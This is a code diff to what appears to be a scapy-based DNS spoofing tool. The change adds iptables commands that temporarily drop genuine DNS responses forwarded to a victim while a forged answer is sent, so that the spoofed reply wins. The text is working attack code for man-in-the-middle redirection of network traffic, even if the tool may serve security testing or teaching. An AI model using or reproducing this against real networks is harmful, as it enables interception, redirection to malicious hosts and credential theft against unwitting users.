@@ -6,6 +6,7 @@ import click
 from scapy.all import DNS, UDP, IP, DNSRR, send, sniff
 from .domains import get_domains
 from .general import get_interface
+import subprocess
 
 # Port used for sniffing dns queries
 port = "udp port 53"
@@ -81,7 +82,9 @@ def analyze_packet(packet, table, interface):
 
     if query_name in table:
         click.echo(f'Found a query to spoof: {query_name}')
+        subprocess.run(['iptables', '-A', 'FORWARD', '-d', packet[IP].dst, '-p', 'udp', '--sport', '53', '-j' 'DROP'])
         spoof_packet(packet, query_name, table[query_name], interface)
+        subprocess.run(['iptables', '-D', 'FORWARD', '-d', packet[IP].dst, '-p', 'udp', '--sport', '53', '-j' 'DROP'])
         return
 
 
